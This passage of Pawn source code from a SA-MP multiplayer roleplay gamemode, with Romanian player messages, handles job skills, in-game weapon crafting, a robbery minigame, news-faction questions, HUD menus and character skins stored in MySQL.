	SCMf(playerid, -1, "Bus Driver Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][14], PlayerInfo[playerid][pJobSkillPoints][14], GetNeedPoints(playerid, 14));
	SCMf(playerid, -1, "Glovo Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][15], PlayerInfo[playerid][pJobSkillPoints][15], GetNeedPoints(playerid, 15));
	SendClientMessage(playerid, -1, "* Use (/skillupgrade) to upgrade to 'skill plus' if you have skill 6 at any job.");
	return true;
}

save_skill(playerid) {
	mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `job_skills` = '%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `id` = '%i'",
        PlayerInfo[playerid][pJobSkill][0], PlayerInfo[playerid][pJobSkill][1], PlayerInfo[playerid][pJobSkill][2], PlayerInfo[playerid][pJobSkill][3],
        PlayerInfo[playerid][pJobSkill][4], PlayerInfo[playerid][pJobSkill][5], PlayerInfo[playerid][pJobSkill][6], PlayerInfo[playerid][pJobSkill][7],
        PlayerInfo[playerid][pJobSkill][8], PlayerInfo[playerid][pJobSkill][9], PlayerInfo[playerid][pJobSkill][10], PlayerInfo[playerid][pJobSkill][11],
        PlayerInfo[playerid][pJobSkill][12], PlayerInfo[playerid][pJobSkill][13], PlayerInfo[playerid][pJobSkill][14], PlayerInfo[playerid][pJobSkill][15], 
        PlayerInfo[playerid][pJobSkill][16],
        PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gQuery, "", "");
}

save_skillpoints(playerid) {
	mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `job_skills_points` = '%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `id`='%i'", 
	    PlayerInfo[playerid][pJobSkillPoints][0], PlayerInfo[playerid][pJobSkillPoints][1], PlayerInfo[playerid][pJobSkillPoints][2], PlayerInfo[playerid][pJobSkillPoints][4], 
		PlayerInfo[playerid][pJobSkillPoints][5], PlayerInfo[playerid][pJobSkillPoints][6], PlayerInfo[playerid][pJobSkillPoints][7], PlayerInfo[playerid][pJobSkillPoints][8], 
		PlayerInfo[playerid][pJobSkillPoints][9], PlayerInfo[playerid][pJobSkillPoints][10], PlayerInfo[playerid][pJobSkillPoints][11],PlayerInfo[playerid][pJobSkillPoints][12], 
		PlayerInfo[playerid][pJobSkillPoints][13], PlayerInfo[playerid][pJobSkillPoints][14], PlayerInfo[playerid][pJobSkillPoints][15],PlayerInfo[playerid][pJobSkillPoints][16], 
		PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gQuery, "", "");
}

stock givePlayerSkill(playerid, skill_points = 1) {
	new job = PlayerInfo[playerid][pJob];
	switch(job) {
		case 11,13,16: job = 11;
		case 7: return true;
	}
	PlayerInfo[playerid][pJobSkillPoints][job] += skill_points;
	UpdateProgress(playerid, 1); save_skillpoints(playerid);
	if(PlayerInfo[playerid][pJobSkillPoints][job] >= GetNeedPoints(playerid, PlayerInfo[playerid][pJob]) && PlayerInfo[playerid][pJobSkill][job] <= 6) {
		if(PlayerInfo[playerid][pJobSkill] >= 6) finishAchievement(playerid, 34);
		PlayerInfo[playerid][pJobSkill][job] ++; PlayerInfo[playerid][pJobSkillPoints][job] = 0;

		va_SendClientMessage(playerid, COLOR_YELLOW, "Felicitari! Noul tau skill la acest job este %d.", PlayerInfo[playerid][pJobSkill][job]);
        save_skill(playerid);
	}
	return true;
}
cmd:creategun(playerid, params[]) {
	if PlayerInfo[playerid][pJob] != 5 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai jobul Arms Dealer!");

	if IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda dintr-un vehicul");

	if(PlayerInfo[playerid][pJailTime])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda in jail!");

	extract params -> new string:result[32]; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/creategun <gun name>");
		SendClientMessage(playerid, -1, "Deagle (1000), M4 (2000), AK47 (1500), CombatShotgun (5000), Rifle(3000).");
		return true;
	}
	switch YHash(result) do {
		case _H<deagle>: {
			if PlayerInfo[playerid][pMats] < 1000 *then 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente materiale!");

			PlayerInfo[playerid][pMats] -= 1000;
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			ServerWeapon(playerid, 24, 50);
			SendClientMessage(playerid, COLOR_YELLOW, "Ai creat arma Deagle cu 1000 de materiale.");
		}
		case _H<m4>: {
			if PlayerInfo[playerid][pMats] < 2000 *then return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente materiale!");
			PlayerInfo[playerid][pMats] -= 2000;
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			ServerWeapon(playerid, 31, 120);
			SendClientMessage(playerid, COLOR_YELLOW, "Ai creat arma M4A4 cu 2000 de materiale.");
		}
		case _H<ak47>: {
			if PlayerInfo[playerid][pMats] < 1500 *then 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente materiale!");

			PlayerInfo[playerid][pMats] -= 1500;
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			ServerWeapon(playerid, 30, 120);
			SendClientMessage(playerid, COLOR_YELLOW, "Ai creat arma AK47 cu 1500 de materiale.");
		}
		case _H<combatshotgun>: {
			if PlayerInfo[playerid][pMats] < 5000 *then 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente materiale!");

			PlayerInfo[playerid][pMats] -= 5000;
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			ServerWeapon(playerid, 27, 20);
			SendClientMessage(playerid, COLOR_YELLOW, "Ai creat arma Combat-Shotgun cu 1500 de materiale.");
		}
		case _H<rifle>: {
			if PlayerInfo[playerid][pMats] < 3000 *then 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente materiale!");

			PlayerInfo[playerid][pMats] -= 3000;
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			ServerWeapon(playerid, 33, 120);
			SendClientMessage(playerid, COLOR_YELLOW, "Ai creat arma Rifle cu 1500 de materiale.");
		}
		default: return SendClientMessage(playerid, -1, "Deagle (1000), M4 (2000), AK47 (1500), CombatShotgun (5000), Rifle(3000).");
	}		
	return true;
}
	
stock GetHudColor(cid) {
	switch(cid) {
		case 1: return 0xB8BFC2FF;
		case 2: return 0xFF0000FF;
		case 3: return 0x00FF2FFF;
		case 4: return 0x0E8C19FF;
		case 5: return 0x0022FFFF;
		case 6: return 0x00AAFFFF;
		case 7: return 0x00FFD0FF;
		case 8: return 0xFFFB00FF;
		case 9: return 0xFF8800FF;
		case 10: return 0xFFB957FF;
		case 11: return 0x8000FFFF;
		case 12: return 0xFF0077FF;	
		default: return 0xFFFFFFFF;					
	}
	return true;
}

stock GetHudColor2(cid) {
	switch(cid) {
		case 1: return 0xB8BFC210;
		case 2: return 0xFF000010;
		case 3: return 0x00FF2F10;
		case 4: return 0x0E8C1910;
		case 5: return 0x0022FF10;
		case 6: return 0x00AAFF10;
		case 7: return 0x00FFD010;
		case 8: return 0xFFFB0010;
		case 9: return 0xFF880010;
		case 10: return 0xFFB95710;
		case 11: return 0x8000FF10;
		case 12: return 0xFF007710;	
		default: return 0xFFFFFF10;							
	}
	return true;
}

cmd:hud(playerid, params[]) {
	if(PlayerInfo[playerid][pConnectTime] < 1) return SendClientMessage(playerid, COLOR_LGREEN, "Ai nevoie de o ora jucata pentru a putea folosi aceasta comanda.");
	new szDialog[1024];
	strcat(szDialog, "HUD Type\tStatus\n");
	strcat(szDialog, PlayerInfo[playerid][pShowJob] == 0 ? "1. Job Info\t{FF0000}Disable{FFFFFF}\n" : "1. Job Info\t{0AC917}Enabled{FFFFFF}\n");
	strcat(szDialog, PlayerInfo[playerid][pShowCeas] == 0 ? "2. Time played\t{FF0000}Disable{FFFFFF}\n" : "2. Time played\t{0AC917}Enabled{FFFFFF}\n");	
	strcat(szDialog, PlayerInfo[playerid][pShowFP] == 0 ? "3. Display FPS\t{FF0000}Disable{FFFFFF}\n" : "3. Display FPS\t{0AC917}Enabled{FFFFFF}\n");	
	strcat(szDialog, PlayerInfo[playerid][pShowHP] == 0 ? "4. Display Health\t{FF0000}Disable{FFFFFF}\n" : "4. Display Health\t{0AC917}Enabled{FFFFFF}\n");
	strcat(szDialog, PlayerInfo[playerid][pShowAP] == 0 ? "5. Display Armour\t{FF0000}Disable{FFFFFF}\n" : "5. Display Armour\t{0AC917}Enabled{FFFFFF}\n");	
	strcat(szDialog, PlayerInfo[playerid][pShowDMG] == 0 ? "6. Damage Informer\t{FF0000}Disable{FFFFFF}\n" : "6. Damage Informer\t{0AC917}Enabled{FFFFFF}\n");			
	strcat(szDialog, PlayerInfo[playerid][pShowBanca] == 0 ? "7. Bank Money Textdraw\t{FF0000}Disable{FFFFFF}\n" : "7. Bank Money Textdraw\t{0AC917}Enabled{FFFFFF}\n");	
	strcat(szDialog, PlayerInfo[playerid][pShowProgress][0] == 0 ? "8. Level Progress\t{FF0000}Disable{FFFFFF}\n" : "8. Level Progress\t{0AC917}Enabled{FFFFFF}\n");			
	strcat(szDialog, PlayerInfo[playerid][pShowProgress][1] == 0 ? "9. Job Progress\t{FF0000}Disable{FFFFFF}\n" : "9. Job Progress\t{0AC917}Enabled{FFFFFF}\n");			
	strcat(szDialog, PlayerInfo[playerid][pHudGen] == 0 ? "10. Speedometer\t{FF0000}Disable{FFFFFF}\n" : "10. Speedometer\t{0AC917}Enabled{FFFFFF}\n");
	strcat(szDialog, PlayerInfo[playerid][pShowProgress][2] == 0 ? "11. Job Goal\t{FF0000}Disable{FFFFFF}\n" : "11. Job Goal\t{0AC917}Enabled{FFFFFF}\n");
	strcat(szDialog, PlayerInfo[playerid][pShowProgress][3] == 0 ? "12. Gift Info\t{FF0000}Disable{FFFFFF}\n" : "12. Gift Info\t{0AC917}Enabled{FFFFFF}\n");
	strcat(szDialog, PlayerInfo[playerid][pShowProgress][4] == 0 ? "13. Daily Collect Info\t{FF0000}Disable{FFFFFF}\n" : "13. Daily Collect Info\t{0AC917}Enabled{FFFFFF}\n");
	ShowPlayerDialog(playerid, DIALOG_SHOW, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}HUD {FFFFFF}Menu:", szDialog, "Ok", "Close");
	return true;
}


cmd:rainbow(playerid, params[]) {
	new idd = PersonalCar(playerid);

	if idd==-1 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un vehicul personal");
	
	if !CarInfo[idd][cRainBow] *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu este upgradat la rainbow!");

	format(gString, 300, "#\tType\tPrice\tStatus\n1.\tStandard\t300 premium points\t{0AC517}Available\n2.\tRed\t250 premium points\t%s\n3.\tBlue\t200 premium points\t%s\n4.\tGreen\t150 premium points\t%s\n5.\tYellow\t100 premium points\t%s",
		CarInfo[idd][cRainbows][0] ? ("{0AC517}Available") : ("{FF0000}Not available"), 
		CarInfo[idd][cRainbows][1] ? ("{0AC517}Available") : ("{FF0000}Not available"), 
		CarInfo[idd][cRainbows][2] ? ("{0AC517}Available") : ("{FF0000}Not available"),
		CarInfo[idd][cRainbows][3] ? ("{0AC517}Available") : ("{FF0000}Not available"));
	ShowPlayerDialog(playerid, DIALOG_RAINBOW, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Rainbow {FFFFFF}Menu", gString, "Select", "Cancel");
	return true;
}

cmd:rob(playerid, params[]) {
	if(PlayerInfo[playerid][pWantedLevel]) return SendErrorMsg(playerid, "Nu poti da rob pentru ca ai wanted!");
	if(p_rob[playerid][r_in_rob]) return SendErrorMsg(playerid, "Ai inceput deja rob-ul.");
	if(PlayerInfo[playerid][pRob] < 8) return SendErrorMsg(playerid, "Nu poti da rob deoarece nu ai 8 puncte de jaf.");
	if(!PlayerInfo[playerid][pCarLic]) return SendErrorMsg(playerid, "Ai nevoie de licenta de condus!");
	if(!PlayerInfo[playerid][pGunLic]) return SendErrorMsg(playerid, "Ai nevoie de licenta de arme!");
	if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	return ShowPlayerDialog(playerid, DIALOG_ROB, DIALOG_STYLE_LIST, "{F4AD42}Rob {FFFFFF}Menu", "{FBC821}[+] Add player\nRob solo", "Select", "Cancel");
}

stock stop_rob(playerid, reason=2) {
	if !p_rob[playerid][r_in_rob] *then
		return true;

	if p_rob[playerid][r_vehicle]!=INVALID_VEHICLE_ID *then
		DestroyVehicleEx(p_rob[playerid][r_vehicle], ""), p_rob[playerid][r_vehicle] = INVALID_VEHICLE_ID;

	p_rob[playerid][r_in_rob] = false;
	RemovePlayerAttachedObject(playerid, 4);
	InHand[playerid] = false;
	DisablePlayerCheckpoint(playerid);
	new id; CP[playerid] = 0;
	if((id=p_rob[playerid][r_coPlayer])!=-1) {
		p_rob[playerid][r_role] = false;
		p_rob[playerid][r_coPlayer]=-1;
		stop_rob(id, 4);
	}
	new _b = p_rob[playerid][r_biz_type]!=18?p_rob[playerid][r_biz_type]:9;
	if(camera_obj[playerid][_b][0]==INVALID_OBJECT_ID) camera_obj[playerid][_b][0] = CreateDynamicObject(1616, rob_camera_pos[_b][0], rob_camera_pos[_b][1], rob_camera_pos[_b][2], 0.0, 0.0, rob_camera_pos[_b][3], -1, -1, playerid);
	if(camera_obj[playerid][_b][1]==INVALID_OBJECT_ID) camera_obj[playerid][_b][1] = CreateDynamicObject(1616, rob_camera_pos[_b][4], rob_camera_pos[_b][5], rob_camera_pos[_b][6], 0.0, 0.0, rob_camera_pos[_b][7], -1, -1, playerid);
	switch(reason) {
		case 0: SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {ffffff}Rob esuat! Motiv: Ai fost ucis.");
		case 1: SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {ffffff}Rob esuat! Motiv: Ai ramas fara masina.");
		case 2: SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {ffffff}Rob esuat.");
		case 3: return GameTextForPlayer(playerid, "~g~successful robbery", 5000, 1);
		case 4: SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {ffffff}Rob esuat! Motiv: Parteneru tau a esuat robul.");
	}
	GameTextForPlayer(playerid, "~r~robbery failed", 5000, 1);
	return true;
}

cmd:questions(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] != 9) return true;
	switch(Questions) {
		case 0: {
			if(TalkingLive[playerid] == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Nu esti intr-un live!");
			Questions = 1;
			SendClientMessage(playerid, COLOR_LGREEN, "Acum playerii pot trimite intrebari!");
		}
		case 1: {
			Questions = 0;
			SendClientMessage(playerid, COLOR_LGREEN, "Acum playerii nu mai pot trimite intrebari!");
		}		
	}
	return true;
}
cmd:question(playerid, params[]) {
	if(Question[playerid] == 1) return SendClientMessage(playerid, -1, "Nu poti pune mai multe intrebari!");
	if(Questions == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu se pot pune intrebari acum!");
	if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Pentru a folosi aceasta comanda, ai nevoie de minim nivel 3!");

	extract params -> new string:result[120]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/question <text>");

	if(strlen(result) < 10) return SendClientMessage(playerid, -1, "Intrebare prea mica!");
	format(gString, 144, "Intrebare de la %s (%d): %s", GetName(playerid), playerid, result);
	SendFactionMessage(9, COLOR_YELLOW, gString);
	Question[playerid] = 1;
	SendClientMessage(playerid, COLOR_YELLOW, "Intrebare trimisa!");
	format(QuestText[playerid], 256, result);
	return true;
}
cmd:aq(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] != 9) return true;
	if(TalkingLive[playerid] == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Nu esti intr-un live!");
	if(Questions == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu poti accepta intrebari acum!");
	new id;
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/aq <playerid/name>");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(Question[id] == 0) return SendClientMessage(playerid, -1, "Acel player nu a pus o intrebare!");
	Question[id] = 0;
	new string[180];
	format(string, sizeof(string), "Intrebare de la %s: %s", GetName(id), QuestText[id]);
	SCMTA(COLOR_LIGHTGREEN, string);
	return true;
}
cmd:news(playerid, params[]) {
	new hour, minute, seconds;
	if(PlayerInfo[playerid][pMember] != 9) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea News Reporters.");
	if(PlayerInfo[playerid][pMuted] == 1)
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if(DeelayCommand[playerid][16]>gettime()) return DeelayTime(playerid, 16);
	new result[250];
	if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/news <text>");
	if(PlayerInfo[playerid][pRank] < 5 && !FactionVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-un vehicul ce apartine factiunii tale!");
	OOCNews(COLOR_NEWS, "NR %s: %s", GetName(playerid), result);		
	CheckMission(playerid, 9);
	gettime(hour, minute, seconds);
	if(minute >= 50) {
		if(news_50min[playerid]) return DeelayCommand[playerid][16] = gettime()+60;
		AddFactionRaport(playerid, 0);	
		news_50min[playerid] = 1;
	}
	else {
		AddFactionRaport(playerid, 1);	
	}
	DeelayCommand[playerid][16] = gettime()+60;		
	return true;
}
cmd:clothes(playerid, params[]) {
	if PlayerInfo[playerid][pTutorial]<3 *then 
		return true;

	if OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda pentru ca esti duty!");

    if !IsAtClothShop(playerid) *then
    	return SendClientMessage(playerid,COLOR_GREY, "Nu esti intr-un magazin de haine.");

	if Escape[playerid] *then {
		Escape[playerid] = 0;

		SendTeamMessage(1, 0x2e64feFF, "Dispatch: %s a reusit sa evadeze.", GetName(playerid));
		SendClientMessage(playerid, COLOR_YELLOW, "Ai reusit sa evadezi!");
		PlayerInfo[playerid][pWantedLevel] = 0;
		PlayerTextDrawHide(playerid, WantedTD);
		SetPlayerWantedLevel(playerid, 0);
		ClearCrime(playerid);
		UpdateVar(playerid, "WantedLevel", PlayerInfo[playerid][pWantedLevel]);		
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	}
	ShowModelSelectionMenu (playerid, skinlist, "Haine");
    return true;
}
cmd:removeglasses(playerid, params[]) {
	new szMessage[180];
	if(PlayerInfo[playerid][pShowGlasses] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu ai ochelarii pe ochi.");
	StopPlayerHoldingObject(playerid);
	PlayerInfo[playerid][pShowGlasses] = 0;
	new szQuery[256];
	mysql_format(SQL, szQuery, sizeof(szQuery), "UPDATE users SET `ShowGlasses` = '%d' WHERE `ID` = '%d'", PlayerInfo[playerid][pShowGlasses], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, szQuery, "", "");
	format(szMessage, 256, "%s si-a scos ochelarii de pe ochi.", GetName(playerid));
	ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE);
	SendClientMessage(playerid, -1, "Pentru a-ti pune la loc ochelarii, trebuie sa folosesti comanda /putglasses.");
	return true;
}
cmd:putglasses(playerid, params[]) {
	new szMessage[180];
	if(PlayerInfo[playerid][pGlasses] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu ai o pereche de ochelari.");
	if(PlayerInfo[playerid][pShowGlasses] == 1) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja ochelarii pe ochi.");
	PlayerInfo[playerid][pShowGlasses] = 1;
	new szQuery[256];
	mysql_format(SQL, szQuery, sizeof(szQuery), "UPDATE users SET `ShowGlasses` = '%d' WHERE `ID` = '%d'", PlayerInfo[playerid][pShowGlasses], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, szQuery, "", "");
	new skin = PlayerInfo[playerid][pModel];
	SetPlayerHoldingObject(playerid, PlayerInfo[playerid][pGlasses], 2, SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
	format(szMessage, 256, "%s si-a pus ochelarii pe ochi.", GetName(playerid));
	ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE);
	return true;
}
cmd:glasses(playerid, params[]) {
	if(IsAtClothShop(playerid)) ShowModelSelectionMenu(playerid, glasses, "Ochelari") ;
	return true;
}

total_skins(playerid) {
	new i,x=0;
	while(++i<(PlayerInfo[playerid][pVip]+1)*10) if PlayerInfo[playerid][pSkins][i] == -1 *then continue; else x++; 
    return x;
}

are_acest_skin(playerid, model) {
	new i;
	while(++i<(PlayerInfo[playerid][pVip]+1)*10) if PlayerInfo[playerid][pSkins][i] != model *then continue; else return true;
    return false;
}



save_skin(playerid) {
	mysql_format(SQL, gQuery, 300, "UPDATE `users` SET `Skin`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID`='%d'",
	    PlayerInfo[playerid][pSkins][0], PlayerInfo[playerid][pSkins][1], PlayerInfo[playerid][pSkins][2], PlayerInfo[playerid][pSkins][3], PlayerInfo[playerid][pSkins][4],
        PlayerInfo[playerid][pSkins][5], PlayerInfo[playerid][pSkins][6], PlayerInfo[playerid][pSkins][7], PlayerInfo[playerid][pSkins][8], PlayerInfo[playerid][pSkins][9], 
        PlayerInfo[playerid][pSkins][10], PlayerInfo[playerid][pSkins][11], PlayerInfo[playerid][pSkins][12], PlayerInfo[playerid][pSkins][13], PlayerInfo[playerid][pSkins][14],
        PlayerInfo[playerid][pSkins][15], PlayerInfo[playerid][pSkins][16], PlayerInfo[playerid][pSkins][17], PlayerInfo[playerid][pSkins][18], PlayerInfo[playerid][pSkins][19],
        PlayerInfo[playerid][pSkins][20], PlayerInfo[playerid][pSkins][21], PlayerInfo[playerid][pSkins][22], PlayerInfo[playerid][pSkins][23], PlayerInfo[playerid][pSkins][24],
        PlayerInfo[playerid][pSkins][25], PlayerInfo[playerid][pSkins][26], PlayerInfo[playerid][pSkins][27], PlayerInfo[playerid][pSkins][28], PlayerInfo[playerid][pSkins][29],
        PlayerInfo[playerid][pSkins][30], PlayerInfo[playerid][pSkins][31], PlayerInfo[playerid][pSkins][32], PlayerInfo[playerid][pSkins][33], PlayerInfo[playerid][pSkins][34],
        PlayerInfo[playerid][pSkins][35], PlayerInfo[playerid][pSkins][36], PlayerInfo[playerid][pSkins][37], PlayerInfo[playerid][pSkins][38], PlayerInfo[playerid][pSkins][39],
    PlayerInfo[playerid][pSQLID]);

    mysql_tquery(SQL, gQuery);
}

give_skin(playerid, model) {
	new pos=-1;
	while(++pos<(PlayerInfo[playerid][pVip]+1)*10) {
		if PlayerInfo[playerid][pSkins][pos] != -1 *then continue;
		PlayerInfo[playerid][pSkins][pos] = model;
		save_skin(playerid);
		break;
	}
}
stock GetSkinRareCMD(skin) {
	switch skin do {
		case 11, 33, 46, 59, 72, 123, 127, 171, 178, 188, 291: return SKIN_RARE;
		case 83, 84, 177, 204, 228, 248, 254, 289, 290, 295, 296, 299: return SKIN_EPIC;
		case 0, 3, 93, 104, 107, 116, 115, 149, 164, 195, 211, 285, 292, 293, 294: return SKIN_LEGENDARY;
		case 106, 120, 121, 184, 186, 219, 221, 260, 263, 269, 273, 297: return SKIN_MYTHIC;
		case 98, 108, 124, 125, 126, 191, 217, 223, 233, 242, 264, 270, 271, 272, 298: return SKIN_TRANSCENDENT;
		case 18, 19, 35, 40, 45, 87, 88, 97, 140, 154, 193, 214, 252: return SKIN_SUMMER;
		case 69, 90, 91, 105, 113, 119, 144, 167, 169, 185, 206: return SKIN_PREMIUM;
		case 162: return SKIN_HALLOWEEN;
		case 12, 41, 55, 85, 92, 138, 141, 152, 172, 194, 216, 251: return SKIN_GIRL;
		case 118, 122, 128, 145, 146, 147, 148, 150, 153, 173, 174, 175, 176, 179, 180, 181, 183, 187, 189, 190: return SKIN_PREMIUMV2;
		case 241: return SKIN_SPECIAL;
		case 14, 36, 51, 64, 80, 102, 130, 131, 157, 159, 199, 207, 237, 245: return SKIN_SUMMERV2;
		default: return SKIN_NONE;
	}
	return SKIN_NONE;
}
stock GetSkinType(skin) {
	new rare[20];
	switch(skin) {
		case 11, 33, 46, 59, 72, 123, 127, 171, 178, 188, 291: rare = "rare";
		case 83, 84, 177, 204, 228, 248, 254, 289, 290, 295, 296, 299: rare = "epic";
		case 0, 3, 93, 104, 107, 116, 115, 149, 164, 195, 211, 285, 292, 293, 294: rare = "Legendary";
		case 106, 120, 121, 184, 186, 219, 221, 260, 263, 269, 273, 297: rare = "mythic";
		case 98, 108, 124, 125, 126, 191, 217, 223, 233, 242, 264, 270, 271, 272, 298: rare = "transcendent";
		case 18, 19, 35, 40, 45, 87, 88, 97, 140, 154, 193, 214, 252: rare = "summer";
		case 69, 90, 91, 105, 113, 119, 144, 167, 169, 185, 206: rare = "premium";
		case 162: rare = "halloween";
		case 12, 41, 55, 85, 92, 138, 141, 152, 172, 194, 216, 251: rare = "girl";
		case 118, 122, 128, 145, 146, 147, 148, 150, 153, 173, 174, 175, 176, 179, 180, 181, 183, 187, 189, 190: rare = "premium v2";
		case 241: rare = "special";
		case 14, 36, 51, 64, 80, 102, 130, 131, 157, 159, 199, 207, 237, 245: rare = "summer v2";
		default: rare = "none";
	}
	return rare;
}
stock GetSkinRare(skin) {
	switch(skin) {
		case 11, 33, 46, 59, 72, 123, 127, 171, 178, 188, 291, 
		83, 84, 177, 204, 228, 248, 254, 289, 290, 295, 296, 299, 
		0, 3, 93, 104, 107, 116, 115, 149, 164, 195, 211, 285, 292, 293, 294, 
		106, 120, 121, 184, 186, 219, 221, 260, 263, 269, 273, 297, 
		98, 108, 124, 125, 126, 191, 217, 223, 233, 242, 264, 270, 271, 272, 298,
		18, 19, 35, 40, 45, 87, 88, 97, 140, 154, 193, 214, 252,
		69, 90, 91, 105, 113, 119, 144, 167, 169, 185, 206, 
		162,
		12, 41, 55, 85, 92, 138, 141, 152, 172, 194, 216, 251,
		118, 122, 128, 145, 146, 147, 148, 150, 153, 173, 174, 175, 176, 179, 180, 181, 183, 187, 189, 190,
		241,
		14, 36, 51, 64, 80, 102, 130, 131, 157, 159, 199, 207, 237, 245: return true;
	}
	return false;
}
cmd:myskins(playerid, params[]) {
	if(player_selected[playerid]) 
		return true;

	if(IsPlayerInAnyVehicle(playerid)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti aceasta comanda dintr-un vehicul!");
	
	if(OnDuty[playerid] == 1)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda cand esti duty.");

	if(PlayerInfo[playerid][pJailTime])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda la jail!");

	if InWarTurf[PlayerInfo[playerid][pMember]] != -1 *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti schimba skinul in timpul war-ului!");

	for(new i=0;i<10;i++) {
		PlayerTextDrawSetPreviewModel(playerid, SkinsPTD[i], PlayerInfo[playerid][pSkins][i] != -1?PlayerInfo[playerid][pSkins][i]:18631);
		PlayerTextDrawBackgroundColor(playerid, SkinsPTD[i], GetSkinRareCMD(PlayerInfo[playerid][pSkins][i]));
		PlayerTextDrawShow(playerid, SkinsPTD[i]);
	}
	PlayerTextDrawShow(playerid, SkinsPTD[10]);
	player_selected[playerid] = 2; td_page[playerid] = 1;
	format(gString, 30, "%d/%d", td_page[playerid], PlayerInfo[playerid][pVip]+1);
	PlayerTextDrawSetString(playerid, SkinsPTD[10], gString);
	for(new i=0;i<11;i++) TextDrawShowForPlayer(playerid, SkinsTD[i]);
	SelectTextDraw(playerid, 0xF7E562FF);
	return true;
}

public OnPlayerModelSelection(playerid, response, listid, modelid) {
	if(listid == hats) {
        if(response) {
			if(GetPlayerCash(playerid) < 500000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani!");
			PlayerInfo[playerid][pHat] = modelid;
			CheckMission(playerid, 21);
			PlayerInfo[playerid][pShowHat] = 1;
			PutHat(playerid);
			finishAchievement(playerid, 1);
			UpdateVar(playerid, "Hat", modelid);
			UpdateVar(playerid, "ShowHat", 1);
			SendClientMessage(playerid, COLOR_YELLOW, "Ti-ai cumparat o palarie! Comenzi disponibile: /puthat, /removehat.");
			BizzInfo[InInteriorID[playerid]][bBalance] += 500000;
            GivePlayerCash(playerid, -500000);
        }
		return true;
    }
	
    if(listid == glasses)
    {
        if(response)
        {
			if(GetPlayerCash(playerid) < 500000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani!");
	    	PlayerInfo[playerid][pGlasses] = modelid;
		    PlayerInfo[playerid][pShowGlasses] = 1;
			CheckMission(playerid, 20);
			new szQuery[256];
			finishAchievement(playerid, 0);
